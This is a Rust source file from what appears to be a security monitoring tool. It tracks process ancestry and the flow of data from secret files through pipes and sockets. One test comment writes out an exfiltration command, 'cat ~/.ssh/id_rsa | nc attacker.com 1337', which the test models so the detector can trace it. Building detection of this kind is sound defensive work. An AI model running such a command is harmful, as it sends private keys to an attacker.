//! In-memory Process Lineage DAG (Directed Acyclic Graph) and Two-Tier Data Flow Graph.
//!
//! Separates process ancestry (Process Graph) from object data transfer (Data Flow Graph)
//! enabling exact causation reconstruction across IPC mechanisms (pipes, FIFOs, SCM_RIGHTS).

use lru::LruCache;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::num::NonZeroUsize;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};

use sentinel_common::process::ProcessNode;
use crate::lineage::process_key::ProcessKey;

/// Process Graph lifecycle edge type.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ProcessEdgeType {
    Fork,
    Exec,
    Exit,
}

/// An edge in the Process Graph tracking ancestry lifecycle.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessEdge {
    pub from: ProcessKey,
    pub to: ProcessKey,
    pub edge_type: ProcessEdgeType,
    pub timestamp_ns: u64,
}

/// An object node in the Data Flow Graph.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum FlowObject {
    SecretFile(PathBuf),
    Pipe { dev: u64, ino: u64 },
    Fifo { path: PathBuf },
    UnixSocket { sun_path: String },
    NetworkSocket { dest_ip: String, dest_port: u16 },
    FileDescriptor(i32),
}

/// Actions performed by processes on data flow objects.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum FlowAction {
    Read,
    Write,
    SendMsg,
    RecvMsg,
    FdPass,
}

/// An edge in the Data Flow Graph capturing data transfer between a process and an object.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DataFlowEdge {
    pub process: ProcessKey,
    pub object: FlowObject,
    pub action: FlowAction,
    pub timestamp_ns: u64,
}

#[derive(Clone)]
pub struct LineageGraph {
    nodes: Arc<Mutex<LruCache<ProcessKey, ProcessNode>>>,
    tgid_index: Arc<Mutex<HashMap<u32, Vec<ProcessKey>>>>,
    process_edges: Arc<Mutex<Vec<ProcessEdge>>>,
    data_flow_edges: Arc<Mutex<Vec<DataFlowEdge>>>,
}

impl LineageGraph {
    pub fn new(capacity: usize) -> Self {
        let cap = NonZeroUsize::new(capacity).unwrap_or(NonZeroUsize::new(8192).unwrap());
        Self {
            nodes: Arc::new(Mutex::new(LruCache::new(cap))),
            tgid_index: Arc::new(Mutex::new(HashMap::new())),
            process_edges: Arc::new(Mutex::new(Vec::new())),
            data_flow_edges: Arc::new(Mutex::new(Vec::new())),
        }
    }

    pub fn node_to_key(node: &ProcessNode) -> ProcessKey {
        ProcessKey::new_with_tgid(node.tgid, node.tgid, node.start_time_ns)
            .with_exe(node.exe_path.clone(), node.exe_dev_ino)
    }

    pub fn insert(&self, node: ProcessNode) {
        let key = Self::node_to_key(&node);
        let tgid = node.tgid;

        let mut g = self.nodes.lock().unwrap();
        if let Some((evicted_key, _)) = g.push(key.clone(), node) {
            let mut idx = self.tgid_index.lock().unwrap();
            if let Some(keys) = idx.get_mut(&evicted_key.tgid) {
                keys.retain(|k| k != &evicted_key);
                if keys.is_empty() {
                    idx.remove(&evicted_key.tgid);
                }
            }
        }

        let mut idx = self.tgid_index.lock().unwrap();
        let keys = idx.entry(tgid).or_default();
        if !keys.contains(&key) {
            keys.push(key);
        }
    }

    pub fn insert_with_key(&self, key: ProcessKey, node: ProcessNode) {
        let tgid = key.tgid;
        let mut g = self.nodes.lock().unwrap();
        if let Some((evicted_key, _)) = g.push(key.clone(), node) {
            let mut idx = self.tgid_index.lock().unwrap();
            if let Some(keys) = idx.get_mut(&evicted_key.tgid) {
                keys.retain(|k| k != &evicted_key);
                if keys.is_empty() {
                    idx.remove(&evicted_key.tgid);
                }
            }
        }

        let mut idx = self.tgid_index.lock().unwrap();
        let keys = idx.entry(tgid).or_default();
        if !keys.contains(&key) {
            keys.push(key);
        }
    }

    pub fn get_by_key(&self, key: &ProcessKey) -> Option<ProcessNode> {
        let mut g = self.nodes.lock().unwrap();
        g.get(key).cloned()
    }

    /// Retrieve the most recent process node instance for a given TGID.
    pub fn get(&self, tgid: u32) -> Option<ProcessNode> {
        let latest_key = {
            let idx = self.tgid_index.lock().unwrap();
            let keys = idx.get(&tgid)?;
            keys.iter().max_by_key(|k| k.start_time_ns)?.clone()
        };

        let mut g = self.nodes.lock().unwrap();
        g.get(&latest_key).cloned()
    }

    pub fn get_mut_with<F, R>(&self, tgid: u32, f: F) -> Option<R>
    where
        F: FnOnce(&mut ProcessNode) -> R,
    {
        let latest_key = {
            let idx = self.tgid_index.lock().unwrap();
            let keys = idx.get(&tgid)?;
            keys.iter().max_by_key(|k| k.start_time_ns)?.clone()
        };

        let mut g = self.nodes.lock().unwrap();
        g.get_mut(&latest_key).map(f)
    }

    pub fn get_mut_by_key_with<F, R>(&self, key: &ProcessKey, f: F) -> Option<R>
    where
        F: FnOnce(&mut ProcessNode) -> R,
    {
        let mut g = self.nodes.lock().unwrap();
        g.get_mut(key).map(f)
    }

    pub fn len(&self) -> usize {
        let g = self.nodes.lock().unwrap();
        g.len()
    }

    pub fn is_empty(&self) -> bool {
        self.len() == 0
    }

    // ------------------------------------------------------------------------
    // Process Graph (Ancestry) Methods
    // ------------------------------------------------------------------------

    pub fn record_process_edge(&self, from: ProcessKey, to: ProcessKey, edge_type: ProcessEdgeType, timestamp_ns: u64) {
        let mut edges = self.process_edges.lock().unwrap();
        edges.push(ProcessEdge {
            from,
            to,
            edge_type,
            timestamp_ns,
        });
        if edges.len() > 16384 {
            edges.drain(..2048);
        }
    }

    pub fn get_process_edges(&self) -> Vec<ProcessEdge> {
        self.process_edges.lock().unwrap().clone()
    }

    // ------------------------------------------------------------------------
    // Data Flow Graph Methods (TASK-P1-14)
    // ------------------------------------------------------------------------

    pub fn record_data_flow(&self, process: ProcessKey, object: FlowObject, action: FlowAction, timestamp_ns: u64) {
        let mut edges = self.data_flow_edges.lock().unwrap();
        edges.push(DataFlowEdge {
            process,
            object,
            action,
            timestamp_ns,
        });
        if edges.len() > 16384 {
            edges.drain(..2048);
        }
    }

    pub fn get_data_flow_edges(&self) -> Vec<DataFlowEdge> {
        self.data_flow_edges.lock().unwrap().clone()
    }

    /// Traces causation path in Data Flow Graph from a secret object to a recipient process.
    pub fn find_data_flow_path(&self, secret_path: &Path, recipient_pid: u32) -> Vec<DataFlowEdge> {
        let edges = self.data_flow_edges.lock().unwrap();
        let target_obj = FlowObject::SecretFile(secret_path.to_path_buf());

        // Find all read edges on the secret object
        let initial_readers: Vec<&DataFlowEdge> = edges
            .iter()
            .filter(|e| e.object == target_obj && e.action == FlowAction::Read)
            .collect();

        let mut path = Vec::new();
        for reader in initial_readers {
            path.push(reader.clone());

            // Check if reader wrote to a pipe/socket that recipient subsequently read
            for pipe_write in edges.iter().filter(|e| e.process.pid == reader.process.pid && e.action == FlowAction::Write) {
                path.push(pipe_write.clone());

                for recipient_read in edges.iter().filter(|e| e.process.pid == recipient_pid && e.object == pipe_write.object && e.action == FlowAction::Read) {
                    path.push(recipient_read.clone());
                    return path;
                }
            }
        }
        path
    }

    /// Find the most recently tainted process node within max_age_ns.
    pub fn find_recent_tainted(&self, now_ns: u64, max_age_ns: u64) -> Option<ProcessNode> {
        let g = self.nodes.lock().unwrap();
        let mut best: Option<ProcessNode> = None;
        let mut best_ts = 0;

        for (_k, v) in g.iter() {
            if let Some(last_sec) = v.secret_accesses.last() {
                let age = now_ns.saturating_sub(last_sec.timestamp_ns);
                if age <= max_age_ns && last_sec.timestamp_ns >= best_ts {
                    best_ts = last_sec.timestamp_ns;
                    best = Some(v.clone());
                }
            }
        }
        best
    }

    /// Prune terminated processes that hold no active secrets from the graph to prevent memory leaks.
    pub fn prune_dead(&self) -> usize {
        let mut g = self.nodes.lock().unwrap();
        let mut to_remove = Vec::new();
        for (key, node) in g.iter() {
            if key.tgid <= 2 || !node.secret_accesses.is_empty() {
                continue;
            }
            let proc_path = format!("/proc/{}", key.tgid);
            if !std::path::Path::new(&proc_path).exists() {
                to_remove.push(key.clone());
            }
        }
        let count = to_remove.len();
        let mut idx = self.tgid_index.lock().unwrap();
        for key in to_remove {
            g.pop(&key);
            if let Some(keys) = idx.get_mut(&key.tgid) {
                keys.retain(|k| k != &key);
                if keys.is_empty() {
                    idx.remove(&key.tgid);
                }
            }
        }
        count
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn test_pid_reuse_coexistence_without_overwrite() {
        let graph = LineageGraph::new(64);

        let mut node1 = ProcessNode::new(4200, 1, 1000, PathBuf::from("/usr/bin/curl"));
        node1.start_time_ns = 1000;
        let key1 = LineageGraph::node_to_key(&node1);
        graph.insert(node1);

        let mut node2 = ProcessNode::new(4200, 1, 1000, PathBuf::from("/usr/bin/python3"));
        node2.start_time_ns = 5000;
        let key2 = LineageGraph::node_to_key(&node2);
        graph.insert(node2);

        assert_eq!(graph.len(), 2);
        let fetched1 = graph.get_by_key(&key1).unwrap();
        assert_eq!(fetched1.exe_path, PathBuf::from("/usr/bin/curl"));
        let fetched2 = graph.get_by_key(&key2).unwrap();
        assert_eq!(fetched2.exe_path, PathBuf::from("/usr/bin/python3"));
    }

    #[test]
    fn test_two_tier_process_and_data_flow_graph() {
        let graph = LineageGraph::new(64);

        // Scenario: cat ~/.ssh/id_rsa | nc attacker.com 1337
        // Both cat (PID 100) and nc (PID 101) are children of bash (PID 50)
        let bash_key = ProcessKey::new(50, 1000).with_exe(PathBuf::from("/bin/bash"), (1, 1));
        let cat_key = ProcessKey::new(100, 2000).with_exe(PathBuf::from("/bin/cat"), (1, 2));
        let nc_key = ProcessKey::new(101, 2005).with_exe(PathBuf::from("/usr/bin/nc"), (1, 3));

        // 1. Process Graph: records fork ancestry
        graph.record_process_edge(bash_key.clone(), cat_key.clone(), ProcessEdgeType::Fork, 2000);
        graph.record_process_edge(bash_key.clone(), nc_key.clone(), ProcessEdgeType::Fork, 2005);

        // 2. Data Flow Graph: records actual data transfers
        let secret_file = FlowObject::SecretFile(PathBuf::from("/home/user/.ssh/id_rsa"));
        let pipe_obj = FlowObject::Pipe { dev: 0, ino: 9988 };

        // cat reads secret
        graph.record_data_flow(cat_key.clone(), secret_file.clone(), FlowAction::Read, 2010);
        // cat writes into pipe
        graph.record_data_flow(cat_key.clone(), pipe_obj.clone(), FlowAction::Write, 2012);
        // nc reads from pipe
        graph.record_data_flow(nc_key.clone(), pipe_obj.clone(), FlowAction::Read, 2015);

        // Correlate: Find causation path connecting ~/.ssh/id_rsa to nc (PID 101)
        let path = graph.find_data_flow_path(Path::new("/home/user/.ssh/id_rsa"), 101);
        assert_eq!(path.len(), 3);
        assert_eq!(path[0].action, FlowAction::Read);
        assert_eq!(path[1].action, FlowAction::Write);
        assert_eq!(path[2].action, FlowAction::Read);
        assert_eq!(path[2].process.pid, 101);
    }
}
